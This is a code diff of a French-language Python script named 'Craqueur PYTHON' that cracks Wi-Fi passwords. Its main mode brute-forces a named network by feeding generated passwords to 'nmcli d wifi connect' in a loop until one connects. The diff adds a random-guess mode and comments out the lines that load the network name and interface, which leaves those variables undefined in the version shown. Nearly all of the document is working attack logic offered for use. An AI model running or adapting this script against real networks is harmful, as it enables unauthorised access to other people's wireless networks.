@@ -1,4 +1,6 @@
 import os
+import random
+'''
 file = open("info.txt","r")
 c = file.read().split('\n')
 nomwifi = c[0]
@@ -7,10 +9,12 @@ file = open("interface.txt","r")
 c = file.read().split('\n')
 interface = c[0]
 file.close()
+'''
 print("Craqueur PYTHON")
+choixz = input("Quel programme de crack : 1 /Brute force ; 2 / Aléatoire")
 
 lettre = []
-find = input('Quelle programme veux-tu : CH / Pour choisir tout les caractères que tu veux; DE / Pour utiliser le script default; SE / Pour le script Social Engenering Crack Wifi : ')
+find = input('Quelle programme de choix de lettres veux-tu : CH / Pour choisir tout les caractères que tu veux; DE / Pour utiliser le script default; SE / Pour le script Social Engenering Crack Wifi : ')
 if find.lower() == 'ch' :
 	i = True
 	print('Ecrit les caractères 1 par 1. Ecrit start pour lancer le code') 
@@ -72,41 +76,83 @@ for i in enlever :
 		lettre = liste
 """
 print(lettre)
-nombre = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
-i = True
-print('nmcli d wifi connect "' + str(nomwifi) + '" password '  + " ifname " + interface)
-while i :
-	nb = nombre[0]
-	nombre[0] = nb + 1
-	for i in nombre :
-		if len(lettre)  in nombre :
-			tour = 0
-			for n in nombre :
-				if int(n) == int(len(lettre)) :
-					changement = tour
-				tour = tour + 1
-			nombre[changement] = 0
-			target = changement + 1
-			nb = nombre[target] 
-			nombre[target] = int(nb) + 1
-	
-	position = 0
-	total = len(nombre) - 1
-	final = []
-	while position < total :
-		if int(nombre[position]) != -1 :
-			po = int(nombre[position])
-			lf = lettre[po]
-			final.append(str(lf))
-		position = position + 1
-	mot = ''.join(final)
-	try :
-		j = os.system('nmcli d wifi connect "' + nomwifi + '" password ' + mot + " ifname " + interface )
-		print(j)
-		if j != 256 :
-			i = False
-		else :	
-			print(mot, end="\r")
-	except :
-		print('')
-print('le mot de passe est : ' + mot )
+if int(choixz) == 1 :
+	nombre = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
+	i = True
+	print('nmcli d wifi connect "' + str(nomwifi) + '" password '  + " ifname " + interface)
+	while i :
+		nb = nombre[0]
+		nombre[0] = nb + 1
+		for i in nombre :
+			if len(lettre)  in nombre :
+				tour = 0
+				for n in nombre :
+					if int(n) == int(len(lettre)) :
+						changement = tour
+					tour = tour + 1
+				nombre[changement] = 0
+				target = changement + 1
+				nb = nombre[target] 
+				nombre[target] = int(nb) + 1
+		
+		position = 0
+		total = len(nombre) - 1
+		final = []
+		while position < total :
+			if int(nombre[position]) != -1 :
+				po = int(nombre[position])
+				lf = lettre[po]
+				final.append(str(lf))
+			position = position + 1
+		mot = ''.join(final)
+		try :
+			j = os.system('nmcli d wifi connect "' + nomwifi + '" password ' + mot + " ifname " + interface )
+			print(j)
+			if j != 256 :
+				i = False
+			else :	
+				print(mot, end="\r")
+		except :
+			print('')
+	print('le mot de passe est : ' + mot )
+else :
+	l = input("Longueur : ")
+	find = input('mot de passe : ')
+	k = 0
+	d = []
+	while k < int(l) :
+		d.append(0)
+		k = k + 1
+	print(d)
+	fin = len(lettre) - 1
+	p = []
+	i = True
+	while i :
+		nombre = d
+		c = 0
+		for t in nombre :
+			n = random.randint(0,fin)
+			nombre[c] = n
+			c = c + 1
+		position = 0
+		total = len(nombre) - 1
+		final = []
+		while position < total :
+			if int(nombre[position]) != -1 :
+				po = int(nombre[position])
+				lf = lettre[po]
+				final.append(str(lf))
+			position = position + 1
+		mot = ''.join(final)
+		if mot in p :
+			print('',end='\r')
+		else :
+			print(nombre,end='\r')
+			print(mot,end='\r')
+			p.append(mot)
+			if str(find) == str(mot) :
+				print('le mot de passe est ' + mot)
+				i = False
+			
+			
+			
